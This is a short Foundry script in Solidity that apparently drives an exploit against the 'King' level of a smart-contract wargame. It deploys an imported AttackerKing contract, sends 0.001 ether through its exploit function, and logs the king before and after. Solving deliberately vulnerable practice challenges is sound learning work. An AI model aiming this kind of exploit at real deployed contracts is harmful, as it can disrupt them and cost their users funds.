// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/09_king.sol";
import "contracts/09_king.sol";

contract AttackerKingScript is Script {
    King king = King(payable(vm.envAddress("INSTANCE")));

    function run() external {
        vm.startBroadcast();

        AttackerKing attackerKing = new AttackerKing();

        console.log("king1", king._king());

        attackerKing.exploit{value: 0.001 ether}(address(king));

        console.log("king2", king._king());

        vm.stopBroadcast();
    }
}
